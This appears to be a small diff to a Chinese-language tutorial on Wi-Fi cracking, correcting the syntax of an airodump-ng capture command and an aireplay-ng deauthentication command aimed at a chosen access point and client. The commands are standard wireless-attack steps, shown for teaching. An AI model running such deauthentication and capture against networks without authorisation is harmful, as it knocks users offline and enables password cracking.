@@ -166,13 +166,13 @@ airodump-ng wlan0mon
 使用airodump-ng 监听指定目标频道
 
 ```bash
-airodump-ng -c <ch> -w /path/to/file --bbsid <bbsid> wlan0mon
+airodump-ng -c <ch> -w aircrack/ --bssid <bssid> wlan0
 ```
 
 使用aireplay-ng 进行解除认证攻击模式
 
 ```bash
-aireplay-ng -0 0 -a <AP address> -c <client address> wlan0mon
+aireplay-ng -0 0 -a <AP address> -c <client address> wlan0
 # 指定AP和客户端的地址，将其进行破解
 ```
 
